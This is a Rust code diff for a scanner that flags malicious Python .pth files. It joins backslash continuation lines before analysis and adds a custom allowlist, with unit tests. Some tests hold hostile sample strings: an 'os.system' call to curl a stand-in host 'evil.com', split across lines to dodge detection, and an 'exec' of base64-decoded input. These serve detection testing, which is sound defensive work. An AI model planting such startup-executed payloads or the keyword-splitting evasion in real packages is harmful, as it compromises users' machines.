@@ -207,12 +207,18 @@ pub fn analyse_pth_line(line: &str) -> PthVerdict {
 /// Analyse an entire `.pth` file.
 ///
 /// The file verdict is the maximum severity of any individual line.
+/// Continuation lines (backslash followed by newline) are joined before
+/// analysis so that keywords split across lines are still detected.
 #[must_use]
 pub fn analyse_pth_file(content: &str) -> FileAnalysis {
     let mut critical_lines = Vec::new();
     let mut warning_lines = Vec::new();
 
-    for (idx, line) in content.lines().enumerate() {
+    // Join Python continuation lines: a backslash immediately before a
+    // newline means the logical line continues on the next physical line.
+    let joined = content.replace("\\\n", "");
+
+    for (idx, line) in joined.lines().enumerate() {
         let verdict = analyse_pth_line(line);
         match verdict.level() {
             ThreatLevel::Critical => {
@@ -251,15 +257,37 @@ pub fn analyse_pth_file(content: &str) -> FileAnalysis {
 ///
 /// If the content hash matches a known-safe entry for the given package,
 /// returns `AllowlistedKnownPackage` regardless of content.
+///
+/// Uses only the built-in default allowlist. To merge user-supplied entries,
+/// use [`analyse_pth_file_with_custom_allowlist`] instead.
 #[must_use]
 pub fn analyse_pth_file_with_context(
     content: &str,
     package_name: &str,
     content_hash: &str,
 ) -> FileAnalysis {
+    analyse_pth_file_with_custom_allowlist(content, package_name, content_hash, None)
+}
+
+/// Analyse a `.pth` file with package context, merging a custom allowlist
+/// with the built-in defaults.
+///
+/// When `custom_allowlist` is `Some`, its entries are appended to the
+/// default allowlist before checking. When `None`, only the defaults
+/// are used (equivalent to [`analyse_pth_file_with_context`]).
+#[must_use]
+pub fn analyse_pth_file_with_custom_allowlist(
+    content: &str,
+    package_name: &str,
+    content_hash: &str,
+    custom_allowlist: Option<&[sanctum_types::config::PthAllowlistEntry]>,
+) -> FileAnalysis {
     use crate::allowlist::{default_allowlist, is_allowlisted};
 
-    let allowlist = default_allowlist();
+    let mut allowlist = default_allowlist();
+    if let Some(extra) = custom_allowlist {
+        allowlist.extend_from_slice(extra);
+    }
     if is_allowlisted(package_name, content_hash, &allowlist) {
         return FileAnalysis {
             verdict: FileVerdict::AllowlistedKnownPackage,
@@ -524,6 +552,101 @@ mod tests {
             "sha256:malicious",
         );
         assert_eq!(result.verdict, FileVerdict::Critical);
+    }
+
+    // ============================================================
+    // CUSTOM ALLOWLIST INTEGRATION (W1)
+    // ============================================================
+
+    #[test]
+    fn custom_allowlist_items_are_respected() {
+        use sanctum_types::config::PthAllowlistEntry;
+
+        let content = "import my_internal_package; my_internal_package.init()";
+        let hash = super::content_hash(content.as_bytes());
+
+        // Without custom allowlist, this would be Warning (has import)
+        let result_without = analyse_pth_file_with_custom_allowlist(
+            content,
+            "my-internal",
+            &hash,
+            None,
+        );
+        assert_eq!(result_without.verdict, FileVerdict::Warning);
+
+        // With a custom allowlist containing this package+hash, it should be allowlisted
+        let custom = vec![PthAllowlistEntry {
+            package: "my-internal".to_string(),
+            hash: hash.clone(),
+        }];
+        let result_with = analyse_pth_file_with_custom_allowlist(
+            content,
+            "my-internal",
+            &hash,
+            Some(&custom),
+        );
+        assert_eq!(result_with.verdict, FileVerdict::AllowlistedKnownPackage);
+    }
+
+    #[test]
+    fn custom_allowlist_does_not_override_wrong_hash() {
+        use sanctum_types::config::PthAllowlistEntry;
+
+        let content = "import suspicious; suspicious.do_thing()";
+        let hash = super::content_hash(content.as_bytes());
+
+        let custom = vec![PthAllowlistEntry {
+            package: "suspicious".to_string(),
+            hash: "sha256:wrong_hash".to_string(),
+        }];
+        let result = analyse_pth_file_with_custom_allowlist(
+            content,
+            "suspicious",
+            &hash,
+            Some(&custom),
+        );
+        // Hash doesn't match, should fall through to analysis
+        assert_eq!(result.verdict, FileVerdict::Warning);
+    }
+
+    // ============================================================
+    // D8: Line continuation joining
+    // ============================================================
+
+    #[test]
+    fn continuation_line_os_system_detected_as_critical() {
+        // os.system( is split across two lines via backslash continuation
+        let content = "os.sy\\\nstem('curl evil.com')";
+        let result = analyse_pth_file(content);
+        assert_eq!(
+            result.verdict,
+            FileVerdict::Critical,
+            "os.system( split across continuation lines must still be Critical"
+        );
+    }
+
+    #[test]
+    fn continuation_line_exec_detected_as_critical() {
+        let content = "ex\\\nec(base64.b64decode('payload'))";
+        let result = analyse_pth_file(content);
+        assert_eq!(result.verdict, FileVerdict::Critical);
+    }
+
+    #[test]
+    fn no_continuation_still_works() {
+        // Normal content without continuation should work as before
+        let content = "exec(base64.b64decode('payload'))";
+        let result = analyse_pth_file(content);
+        assert_eq!(result.verdict, FileVerdict::Critical);
+    }
+
+    #[test]
+    fn benign_path_with_backslash_not_false_positive() {
+        // A Windows-style path with backslash NOT followed by newline
+        // should remain benign (backslash in the middle of a line is fine)
+        let content = "C:\\Python312\\Lib\\site-packages\\pkg";
+        let result = analyse_pth_file(content);
+        assert_eq!(result.verdict, FileVerdict::Safe);
     }
 }
 
